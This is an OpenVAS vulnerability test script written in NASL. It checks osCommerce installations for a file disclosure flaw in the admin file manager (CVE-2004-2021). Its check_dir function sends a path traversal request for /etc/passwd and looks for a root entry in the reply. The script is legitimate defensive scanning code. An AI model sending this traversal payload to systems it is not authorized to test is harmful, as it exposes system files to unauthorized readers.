# OpenVAS Vulnerability Test
# $Id: oscommerce_file_manager_disclosure.nasl 17 2013-10-27 14:01:43Z jan $
# Description: File Disclosure in osCommerce's File Manager
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "There is a vulnerability in the osCommerce's File Manager
that allows an attacker to retrieve arbitrary files
from the webserver that reside outside the bounding HTML root
directory.";

# From: Rene <l0om@excluded.org>
# Subject: oscommerce 2.2 file_manager.php file browsing
# Date: 17.5.2004 22:37

if(description)
{
  script_id(12242);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");

  script_cve_id("CVE-2004-2021");
  script_bugtraq_id(10364);
  script_xref(name:"OSVDB", value:"6308");

  name = "File Disclosure in osCommerce's File Manager";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary;

  script_description(desc);
 
  summary = "Detect osCommerce's File Manager File Disclosure";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");

  family = "General";
  script_family(family);
  script_dependencies("oscommerce_detect.nasl");
  script_require_keys("Software/osCommerce");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! port) exit(0);
if(!get_port_state(port)) exit(0);


function check_dir(path)
{
	req = http_get(item:string(path, 
		"/admin/file_manager.php?action=download&filename=../../../../../../../../etc/passwd"), 
		port:port);
 	res = http_keepalive_send_recv(port:port, data:req);
	if ( res == NULL ) exit(0);
 	if(egrep(pattern:".*root:.*:0:[01]:.*", string:res))
 	{
  		security_warning(port);
  		exit(0);
 	}

}


dirs = get_kb_list("Software/osCommerce/dir");

foreach dir ( dirs ) check_dir(path:dir);

